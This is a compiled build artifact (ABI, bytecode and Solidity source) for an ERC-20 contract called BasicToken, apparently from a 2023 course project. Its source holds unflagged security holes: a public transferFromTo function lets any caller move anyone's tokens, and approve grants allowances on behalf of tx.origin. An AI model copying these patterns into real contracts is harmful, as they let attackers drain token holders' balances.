{
  "contractName": "BasicToken",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "_name",
          "type": "string"
        },
        {
          "internalType": "string",
          "name": "_symbol",
          "type": "string"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFromTo",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526012600a62000014919062000266565b620f4240620000249190620002b7565b6004553480156200003457600080fd5b50604051620018713803806200187183398181016040528101906200005a919062000495565b81600090816200006b91906200075b565b5080600190816200007d91906200075b565b50600454600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505062000842565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60008160011c9050919050565b6000808291508390505b60018511156200015a57808604811115620001325762000131620000cc565b5b6001851615620001425780820291505b80810290506200015285620000fb565b945062000112565b94509492505050565b60008262000175576001905062000248565b8162000185576000905062000248565b81600181146200019e5760028114620001a957620001df565b600191505062000248565b60ff841115620001be57620001bd620000cc565b5b8360020a915084821115620001d857620001d7620000cc565b5b5062000248565b5060208310610133831016604e8410600b8410161715620002195782820a905083811115620002135762000212620000cc565b5b62000248565b62000228848484600162000108565b92509050818404811115620002425762000241620000cc565b5b81810290505b9392505050565b6000819050919050565b600060ff82169050919050565b600062000273826200024f565b9150620002808362000259565b9250620002af7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff848462000163565b905092915050565b6000620002c4826200024f565b9150620002d1836200024f565b9250828202620002e1816200024f565b91508282048414831517620002fb57620002fa620000cc565b5b5092915050565b6000604051905090565b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6200036b8262000320565b810181811067ffffffffffffffff821117156200038d576200038c62000331565b5b80604052505050565b6000620003a262000302565b9050620003b0828262000360565b919050565b600067ffffffffffffffff821115620003d357620003d262000331565b5b620003de8262000320565b9050602081019050919050565b60005b838110156200040b578082015181840152602081019050620003ee565b60008484015250505050565b60006200042e6200042884620003b5565b62000396565b9050828152602081018484840111156200044d576200044c6200031b565b5b6200045a848285620003eb565b509392505050565b600082601f8301126200047a576200047962000316565b5b81516200048c84826020860162000417565b91505092915050565b60008060408385031215620004af57620004ae6200030c565b5b600083015167ffffffffffffffff811115620004d057620004cf62000311565b5b620004de8582860162000462565b925050602083015167ffffffffffffffff81111562000502576200050162000311565b5b620005108582860162000462565b9150509250929050565b600081519050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806200056d57607f821691505b60208210810362000583576200058262000525565b5b50919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b600060088302620005ed7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82620005ae565b620005f98683620005ae565b95508019841693508086168417925050509392505050565b6000819050919050565b60006200063c6200063662000630846200024f565b62000611565b6200024f565b9050919050565b6000819050919050565b62000658836200061b565b62000670620006678262000643565b848454620005bb565b825550505050565b600090565b6200068762000678565b620006948184846200064d565b505050565b5b81811015620006bc57620006b06000826200067d565b6001810190506200069a565b5050565b601f8211156200070b57620006d58162000589565b620006e0846200059e565b81016020851015620006f0578190505b62000708620006ff856200059e565b83018262000699565b50505b505050565b600082821c905092915050565b6000620007306000198460080262000710565b1980831691505092915050565b60006200074b83836200071d565b9150826002028217905092915050565b62000766826200051a565b67ffffffffffffffff81111562000782576200078162000331565b5b6200078e825462000554565b6200079b828285620006c0565b600060209050601f831160018114620007d35760008415620007be578287015190505b620007ca85826200073d565b8655506200083a565b601f198416620007e38662000589565b60005b828110156200080d57848901518255600182019150602085019450602081019050620007e6565b868310156200082d578489015162000829601f8916826200071d565b8355505b6001600288020188555050505b505050505050565b61101f80620008526000396000f3fe608060405234801561001057600080fd5b506004361061009e5760003560e01c8063579952fc11610066578063579952fc1461015d57806370a082311461018d57806395d89b41146101bd578063a9059cbb146101db578063dd62ed3e1461020b5761009e565b806306fdde03146100a3578063095ea7b3146100c157806318160ddd146100f157806323b872dd1461010f578063313ce5671461013f575b600080fd5b6100ab61023b565b6040516100b891906109f1565b60405180910390f35b6100db60048036038101906100d69190610aac565b6102c9565b6040516100e89190610b07565b60405180910390f35b6100f96102e0565b6040516101069190610b31565b60405180910390f35b61012960048036038101906101249190610b4c565b6102ea565b6040516101369190610b07565b60405180910390f35b610147610312565b6040516101549190610bbb565b60405180910390f35b61017760048036038101906101729190610b4c565b610317565b6040516101849190610b07565b60405180910390f35b6101a760048036038101906101a29190610bd6565b61032f565b6040516101b49190610b31565b60405180910390f35b6101c5610378565b6040516101d291906109f1565b60405180910390f35b6101f560048036038101906101f09190610aac565b610406565b6040516102029190610b07565b60405180910390f35b61022560048036038101906102209190610c03565b610422565b6040516102329190610b31565b60405180910390f35b6000805461024890610c72565b80601f016020809104026020016040519081016040528092919081815260200182805461027490610c72565b80156102c15780601f10610296576101008083540402835291602001916102c1565b820191906000526020600020905b8154815290600101906020018083116102a457829003601f168201915b505050505081565b60006102d63284846104a9565b6001905092915050565b6000600454905090565b6000803390506102fb858285610672565b6103068585856106fe565b60019150509392505050565b601281565b60006103248484846106fe565b600190509392505050565b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6001805461038590610c72565b80601f01602080910402602001604051908101604052809291908181526020018280546103b190610c72565b80156103fe5780601f106103d3576101008083540402835291602001916103fe565b820191906000526020600020905b8154815290600101906020018083116103e157829003601f168201915b505050505081565b6000803390506104178185856106fe565b600191505092915050565b6000600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610518576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161050f90610d15565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610587576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161057e90610da7565b60405180910390fd5b80600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040516106659190610b31565b60405180910390a3505050565b600061067e8484610422565b90507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff81146106f857818110156106ea576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106e190610e13565b60405180910390fd5b6106f784848484036104a9565b5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff160361076d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161076490610ea5565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036107dc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107d390610f37565b60405180910390fd5b6000600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905081811015610863576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161085a90610fc9565b60405180910390fd5b818103600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555081600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516109539190610b31565b60405180910390a350505050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561099b578082015181840152602081019050610980565b60008484015250505050565b6000601f19601f8301169050919050565b60006109c382610961565b6109cd818561096c565b93506109dd81856020860161097d565b6109e6816109a7565b840191505092915050565b60006020820190508181036000830152610a0b81846109b8565b905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610a4382610a18565b9050919050565b610a5381610a38565b8114610a5e57600080fd5b50565b600081359050610a7081610a4a565b92915050565b6000819050919050565b610a8981610a76565b8114610a9457600080fd5b50565b600081359050610aa681610a80565b92915050565b60008060408385031215610ac357610ac2610a13565b5b6000610ad185828601610a61565b9250506020610ae285828601610a97565b9150509250929050565b60008115159050919050565b610b0181610aec565b82525050565b6000602082019050610b1c6000830184610af8565b92915050565b610b2b81610a76565b82525050565b6000602082019050610b466000830184610b22565b92915050565b600080600060608486031215610b6557610b64610a13565b5b6000610b7386828701610a61565b9350506020610b8486828701610a61565b9250506040610b9586828701610a97565b9150509250925092565b600060ff82169050919050565b610bb581610b9f565b82525050565b6000602082019050610bd06000830184610bac565b92915050565b600060208284031215610bec57610beb610a13565b5b6000610bfa84828501610a61565b91505092915050565b60008060408385031215610c1a57610c19610a13565b5b6000610c2885828601610a61565b9250506020610c3985828601610a61565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b60006002820490506001821680610c8a57607f821691505b602082108103610c9d57610c9c610c43565b5b50919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b6000610cff60248361096c565b9150610d0a82610ca3565b604082019050919050565b60006020820190508181036000830152610d2e81610cf2565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b6000610d9160228361096c565b9150610d9c82610d35565b604082019050919050565b60006020820190508181036000830152610dc081610d84565b9050919050565b7f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000600082015250565b6000610dfd601d8361096c565b9150610e0882610dc7565b602082019050919050565b60006020820190508181036000830152610e2c81610df0565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b6000610e8f60258361096c565b9150610e9a82610e33565b604082019050919050565b60006020820190508181036000830152610ebe81610e82565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b6000610f2160238361096c565b9150610f2c82610ec5565b604082019050919050565b60006020820190508181036000830152610f5081610f14565b9050919050565b7f45524332303a207472616e7366657220616d6f756e742065786365656473206260008201527f616c616e63650000000000000000000000000000000000000000000000000000602082015250565b6000610fb360268361096c565b9150610fbe82610f57565b604082019050919050565b60006020820190508181036000830152610fe281610fa6565b905091905056fea2646970667358221220e6e5e7bb2ce55c04e861f86a2d759153e8eecce7c8882c4ea0b1cef80c3a17e364736f6c63430008120033",
  "immutableReferences": {},
  "source": "pragma solidity ^0.8.0;\r\nimport \"./IERC20.sol\";\r\n\r\ncontract BasicToken is IERC20 {\r\n    string public name;\r\n    string public symbol;\r\n    uint8 public constant decimals = 18;\r\n\r\n    mapping(address => uint256) private _balances;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowed;\r\n\r\n    uint256 _totalSupply = 1000000 * 10 ** decimals ;\r\n\r\n    constructor(string memory _name, string memory _symbol) {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        _balances[msg.sender] = _totalSupply;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address sender) public view override returns (uint256) {\r\n        return _balances[sender];\r\n    }\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) public view override returns (uint) {\r\n        return _allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFromTo(address from, address to, uint256 amount) public returns (bool) {\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\r\n            // decrementing then incrementing.\r\n            _balances[to] += amount;\r\n        }\r\n\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _approve(tx.origin, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        address spender  = msg.sender;\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function _spendAllowance(address owner, address spender, uint256 amount) private {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowed[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}\r\n",
  "sourcePath": "G:\\BDP-2023\\contracts\\BasicToken.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.18+commit.87f61d96.Emscripten.clang"
  },
  "schemaVersion": "3.4.12",
  "updatedAt": "2023-04-26T22:44:12.343Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}